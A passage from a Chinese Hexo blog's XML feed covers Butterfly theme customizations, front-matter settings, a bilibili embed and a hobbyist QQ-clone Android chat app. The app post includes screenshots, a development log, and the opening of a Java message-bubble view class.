href="https://akilar.top/posts/1f9c68c9/">Akilarの糖果屋的《Gitcalendar》</a>。本博客使用冰老师的<strong><code>hexo-githubcalendar 插件 1.2.2版本</code></strong>。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/03/添加GitHub提交日历/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/03/添加GitHub提交日历/</p></div></a></div></div><h2 id="2-14添加看板娘"><a href="#2-14添加看板娘" class="headerlink" title="2.14添加看板娘"></a>2.14添加看板娘</h2><div class="note success flat"><p>此魔改参考：<a href="https://akilar.top/posts/5b8f515f/#大神魔改看板娘（会说话，能换装）">Akilarの糖果屋的《Live2d Widget》教程贴中的大神魔改看板娘（会说话，能换装）部分。</a>并通过修改<strong><code>waifu.css</code></strong>文件调整了看板娘布局位置。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/03/添加看板娘/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/03/添加看板娘/</p></div></a></div></div><h2 id="2-15npm图床搭建"><a href="#2-15npm图床搭建" class="headerlink" title="2.15npm图床搭建"></a>2.15npm图床搭建</h2><div class="note success flat"><p>本文参考文章：<a href="https://akilar.top/posts/3e956346/">Akilarの糖果屋的《npm 图床的使用技巧》</a>。记录一下，方便找到回家的路。</p><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/22/npm图床搭建/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/22/npm图床搭建/</p></div></a></div></div>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Page&amp;Post Front-matter</title>
      <link href="2021/10/01/Page&amp;Post%20Front-matter/"/>
      <url>2021/10/01/Page&amp;Post%20Front-matter/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Front-matter"><a href="#1-Front-matter" class="headerlink" title="1.Front-matter"></a>1.Front-matter</h2><p>Front-matter 是 markdown 文件最上方以 —- 分隔的区域，用于指定个别档案的变数。</p><ul><li>Page Front-matter 用于页面配置</li><li>Post Front-matter 用于文章页配置</li></ul><h3 id="Page-Front-matter"><a href="#Page-Front-matter" class="headerlink" title="Page Front-matter"></a>Page Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: #【必需】页面标题</span><br><span class="line">date: #【必需】页面创建日期</span><br><span class="line">updated: #【可选】页面更新日期</span><br><span class="line">type: #【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">comments: #【可选】显示页面评论模块(默认 true)</span><br><span class="line">description: #【可选】页面描述</span><br><span class="line">keywords: #【可选】页面关键字</span><br><span class="line">top<span class="emphasis">_img: #【可选】页面顶部图片</span></span><br><span class="line"><span class="emphasis">mathjax: #【可选】显示mathjax(当设置mathjax的per_</span>page: false时，才需要配置，默认 false)</span><br><span class="line">katex: #【可选】显示katex(当设置katex的per<span class="emphasis">_page: false时，才需要配置，默认 false)</span></span><br><span class="line"><span class="emphasis">aside: #【可选】显示侧边栏 (默认 true)</span></span><br><span class="line"><span class="emphasis">aplayer: #【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink: #【可选】配置代码框是否展开(true/false)(默认为设置中highlight<span class="emphasis">_shrink的配置)</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><h3 id="Post-Front-matter"><a href="#Post-Front-matter" class="headerlink" title="Post Front-matter"></a>Post Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: #【必需】文章标题</span><br><span class="line">date: #【必需】文章创建日期</span><br><span class="line">updated: #【可选】文章更新日期</span><br><span class="line">tags: #【可选】文章标籤</span><br><span class="line">categories: #【可选】文章分类</span><br><span class="line">keywords: #【可选】文章关键字</span><br><span class="line">description: #【可选】文章描述</span><br><span class="line">top<span class="emphasis">_img: #【可选】文章顶部图片</span></span><br><span class="line"><span class="emphasis">comments: #【可选】显示文章评论模块(默认 true)</span></span><br><span class="line"><span class="emphasis">cover: #【可选】文章缩略图(如果没有设置top_</span>img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">toc: #【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc<span class="emphasis">_number: #【可选】显示toc_</span>number(默认为设置中toc的number配置)</span><br><span class="line">copyright: #【可选】显示文章版权模块(默认为设置中post<span class="emphasis">_copyright的enable配置)</span></span><br><span class="line"><span class="emphasis">copyright_</span>author: #【可选】文章版权模块的文章作者</span><br><span class="line">copyright<span class="emphasis">_author_</span>href: #【可选】文章版权模块的文章作者链接</span><br><span class="line">copyright<span class="emphasis">_url: #【可选】文章版权模块的文章连结链接</span></span><br><span class="line"><span class="emphasis">copyright_</span>info: #【可选】文章版权模块的版权声明文字</span><br><span class="line">mathjax: #【可选】显示mathjax(当设置mathjax的per<span class="emphasis">_page: false时，才需要配置，默认 false)</span></span><br><span class="line"><span class="emphasis">katex: #【可选】显示katex(当设置katex的per_</span>page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer: #【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight<span class="emphasis">_shrink: #【可选】配置代码框是否展开(true/false)(默认为设置中highlight_</span>shrink的配置)</span><br><span class="line">aside: #【可选】显示侧边栏 (默认 true)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="2-博客嵌入bilibili视频播放器"><a href="#2-博客嵌入bilibili视频播放器" class="headerlink" title="2.博客嵌入bilibili视频播放器"></a>2.博客嵌入bilibili视频播放器</h2><p>直接将下面代码粘贴在文章中，src修改为自己bilibili视频的分享下的嵌入代码里的src地址：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=335458796&amp;bvid=BV1qA411F778&amp;cid=404894500&amp;page=1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;allowfullscreen&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-top-navigation allow-same-origin allow-forms allow-scripts&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 文章和页面配置项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高仿QQ实现即时通讯</title>
      <link href="2021/09/26/%E9%AB%98%E4%BB%BFQQ%E5%AE%9E%E7%8E%B0%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/"/>
      <url>2021/09/26/%E9%AB%98%E4%BB%BFQQ%E5%AE%9E%E7%8E%B0%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-开发进度"><a href="#1-开发进度" class="headerlink" title="1.开发进度"></a>1.开发进度</h1><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>高仿QQ实现即时通讯项目进度：70%</p></div></div><h1 id="2-开发日志"><a href="#2-开发日志" class="headerlink" title="2.开发日志"></a>2.开发日志</h1><details class="folding-tag" cyan><summary> Android开发日志 </summary>              <div class='content'>              <div class="timeline"><div class="timenode"><div class="meta"><p><p>2020-09-12 <a href="">2.2</a></p></p></div><div class="body"><p>​        实现分类创建群组功能。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-09-10 <a href="">2.1</a></p></p></div><div class="body"><p>​        实现自定义分类创建群组界面。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-09-05 <a href="">2.0</a></p></p></div><div class="body"><p>​        实现群组分组展示、选择好友创建群聊。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-09-01 <a href="">1.9</a></p></p></div><div class="body"><p>​        更换视频播放器。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-27 <a href="">1.8</a></p></p></div><div class="body"><p>​        实现图片、视频选择器。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-25 <a href="">1.7</a></p></p></div><div class="body"><p>​        修复自定义九宫格展示视频时，视频未加载完成出现透明直接看见手机应用界面的bug。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-21 <a href="">1.6</a></p></p></div><div class="body"><p>​        自定义好友动态九宫格图片视频展示功能、图片大图查看功能。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-16 <a href="">1.5</a></p></p></div><div class="body"><p>​        实现好友动态点赞、动态评论功能。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-13 <a href="">1.4</a></p></p></div><div class="body"><p>​        使用SSM框架实现朋友圈动态后端接口实现（发布动态、获取朋友动态）。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-5 <a href="">1.3</a></p></p></div><div class="body"><p>​        实现朋友圈动态界面布局、及发布动态相关界面。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-08-2 <a href="">1.2</a></p></p></div><div class="body"><p>​        实现添加好友、动态列表。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-07-28 <a href="">1.1</a></p></p></div><div class="body"><p>​        集成环信SDK，实现主界面框架、消息列表、好友列表。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-07-24 <a href="">1.0</a></p></p></div><div class="body"><p>​        实现登录注册功能。</p></div></div></div>              </div>            </details><h1 id="3-实现效果"><a href="#3-实现效果" class="headerlink" title="3.实现效果"></a>3.实现效果</h1><iframe src="//player.bilibili.com/player.html?aid=587995513&bvid=BV1mq4y1f7o1&cid=334766257&page=1" width="100%" height="500" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h1 id="4-说明"><a href="#4-说明" class="headerlink" title="4.说明"></a>4.说明</h1><p>自学了Android开发后，突然对QQ的交互体验和设计感兴趣，便想模仿QQ的设计实现一个仿QQ的即时通讯App。在实现过程中根据QQ的界面功能进行模仿开发。因为不知道QQ用了哪些技术，所以在实现的过程中全靠根据QQ的界面和交互动画来进行想象并实现。虽然还有很多不完善的地方，但基本实现了QQ的一些基本功能（为什么不是全部呢？因为QQ功能实在太多，而且我是一个人开发，当做自学完Android原生开发后的一个练手项目。由于本人技术还比较菜，所以有些效果不能完全相同），并且加了一些自己的想法。以下是我实现的一些功能效果图：</p><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.10/MyQQ_ProjectImage/S10626-15435367.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">登录界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.10/MyQQ_ProjectImage/S10626-15435983.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">注册界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.10/MyQQ_ProjectImage/S10626-15442345.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">消息界面</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15444440.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">联系人界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15445705.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">动态界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15450864.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">抽屉栏界面</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15472142.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">好友聊天界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15475608.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">群聊天界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15490785.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">好友聊天设置界面</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15481545.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">群聊天设置界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15491202.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">删除好友弹窗</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15492533.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">解散群聊或退出群聊弹窗</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S20210626160413.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">退出登录弹窗</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15445050.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">添加好友及通知界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15455120.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">选择好友创建群聊界面</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15460316.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">按分类创建群聊界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15461017.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">创建群聊界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15462203.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">二维码生成界面</font></p>    </div></div><div align="center">    <span align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15505650.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">好友动态界面（1）</font></p>    </span>    <span align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15510070.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">好友动态界面（2）</font></p>    </span>    <span align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15502899.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">写说说界面</font></p>    </span></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15504273.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">选择说说图片界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15522577.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">收到消息通知弹窗</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15523462.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">收到消息通知</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15451662.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">相册界面指纹验证弹窗</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15453764.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">我的博客嵌入界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15470241.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">扫描二维码界面</font></p>    </div></div><div align="center">    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15484746.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">群公告界面</font></p>    </div>    <div align="center" style="display:inline-block;">        <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo/MyQQ_ProjectImage/S10626-15485286.jpg" width="250px"/>        <p><font face="楷体" size="4" color="#888888">发表群公告界面</font></p>    </div></div><p>好了，以上就是我实现的一些功能截图。通过这个项目也学到了很多的新东西，并且在实现的过程中也遇到了许多的困难，但是好在我通过不断地学习也成功的解决了这些问题。由于时间问题，项目中还有很多功能未实现，也有许多bug（包括一些不符合我的要求的设计，可能我有一点强迫症和完美主义的原因吧！由于时间关系还没来得及解决或者说暂时还没有想到更好的方案去实现，O(∩_∩)O哈哈~）未解决。等想到更好的方法和方案再去修改吧。总的来说这个项目对我还是有很大提升的。</p><h1 id="5-使用到的技术"><a href="#5-使用到的技术" class="headerlink" title="5.使用到的技术"></a>5.使用到的技术</h1><ol><li>前端：Android的原生开发（glide,OKHttp….）、环信SDK3.6.2等</li><li>后端：jdk1.8、Spring、SpringMVC、MyBatis、MySQL5.7、Redis6.0等</li><li>开发工具：Android Studio、IntelliJ IDEA 2019.1 x64、Navicat for MySQL、Postman（接口测试）</li></ol><h1 id="6-网友问题答疑"><a href="#6-网友问题答疑" class="headerlink" title="6.网友问题答疑"></a>6.网友问题答疑</h1><p>最近B站许多小伙伴私信我要源码，可是因为我用的工具版本比较老旧，还有<a href="https://developer.android.google.cn/studio/releases/gradle-plugin">Android Gradle 插件</a>的<code>JCenter 代码库已于 2021 年 3 月 31 日变为只读代码库</code>的原因，所以就不开源了。但是可以提供一下我的思路，以及一些问题的解决方法。</p><h2 id="1-消息气泡怎么实现的？"><a href="#1-消息气泡怎么实现的？" class="headerlink" title="1.消息气泡怎么实现的？"></a>1.消息气泡怎么实现的？</h2><p><strong><code>DragMsgView.class</code></strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.animation.Animator;</span><br><span class="line"><span class="keyword">import</span> android.animation.AnimatorListenerAdapter;</span><br><span class="line"><span class="keyword">import</span> android.animation.ValueAnimator;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.res.Resources;</span><br><span class="line"><span class="keyword">import</span> android.content.res.TypedArray;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.graphics.BitmapFactory;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Canvas;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Color;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Paint;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Path;</span><br><span class="line"><span class="keyword">import</span> android.graphics.PointF;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Rect;</span><br><span class="line"><span class="keyword">import</span> android.support.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.widget.AppCompatTextView;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.util.DisplayMetrics;</span><br><span class="line"><span class="keyword">import</span> android.view.MotionEvent;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.view.animation.LinearInterpolator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.administrator.myqq.R;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Administrator on 2021/5/3.</span></span><br><span class="line"><span class="comment"> * 仿qq消息气泡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DragMsgView</span> <span class="keyword">extends</span> <span class="title">AppCompatTextView</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> DragDotView mDragDotView;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mWidth, mHeight;</span><br><span class="line">    <span class="keyword">private</span> OnDragListener mDragListener;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DragMsgView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(context, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DragMsgView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSizeChanged</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h, <span class="keyword">int</span> oldw, <span class="keyword">int</span> oldh)</span> </span>&#123;</span><br><span class="line">        mWidth = w;</span><br><span class="line">        mHeight = h;</span><br><span class="line">        <span class="keyword">super</span>.onSizeChanged(w, h, oldw, oldh);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouchEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获得根View</span></span><br><span class="line">        View rootView = getRootView();</span><br><span class="line">        <span class="comment">//获得触摸位置在全屏所在位置</span></span><br><span class="line">        <span class="keyword">float</span> mRawX = event.getRawX();</span><br><span class="line">        <span class="keyword">float</span> mRawY = event.getRawY();</span><br><span class="line">        <span class="keyword">switch</span> (event.getAction())&#123;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">                <span class="comment">//子view决定自己处理此事件，并阻止父控件处理这个事件</span></span><br><span class="line">                getParent().requestDisallowInterceptTouchEvent(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">//获得当前View控件在其整个屏幕上的坐标位置</span></span><br><span class="line">                <span class="keyword">int</span>[] cLocation = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">                getLocationOnScreen(cLocation);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(rootView <span class="keyword">instanceof</span> ViewGroup)&#123;</span><br><span class="line">                    mDragDotView = <span class="keyword">new</span> DragDotView(getContext());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//设置固定圆和移动圆的圆心坐标</span></span><br><span class="line">                    mDragDotView.setDragPoint(cLocation[<span class="number">0</span>] + mWidth / <span class="number">2</span>, cLocation[<span class="number">1</span>] + mHeight / <span class="number">2</span>, mRawX, mRawY);</span><br><span class="line"></span><br><span class="line">                    Bitmap bitmap = getBitmapFromView(<span class="keyword">this</span>);</span><br><span class="line">                    <span class="keyword">if</span>(bitmap != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        mDragDotView.setCacheBitmap(bitmap);</span><br><span class="line">                        ((ViewGroup) rootView).addView(mDragDotView);</span><br><span class="line">                        setVisibility(INVISIBLE);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">                getParent().requestDisallowInterceptTouchEvent(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">if</span>(mDragDotView != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    mDragDotView.move(mRawX, mRawY);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">                getParent().requestDisallowInterceptTouchEvent(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">if</span>(mDragDotView != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    mDragDotView.up();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将当前view缓存为bitmap，拖动的时候直接绘制此bitmap</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> view</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bitmap <span class="title">getBitmapFromView</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);</span><br><span class="line">        Canvas canvas = <span class="keyword">new</span> Canvas(bitmap);</span><br><span class="line">        view.draw(canvas);</span><br><span class="line">        <span class="keyword">return</span> bitmap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DragDotView</span> <span class="keyword">extends</span> <span class="title">View</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 气泡默认状态--静止</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> BUBBLE_STATE_DEFAULT = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 气泡相连</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> BUBBLE_STATE_CONNECT = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 气泡分离</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> BUBBLE_STATE_APART = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 气泡消失</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> BUBBLE_STATE_DISMISS = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 气泡半径</span></span><br><span class="line">        <span class="keyword">private</span> <span 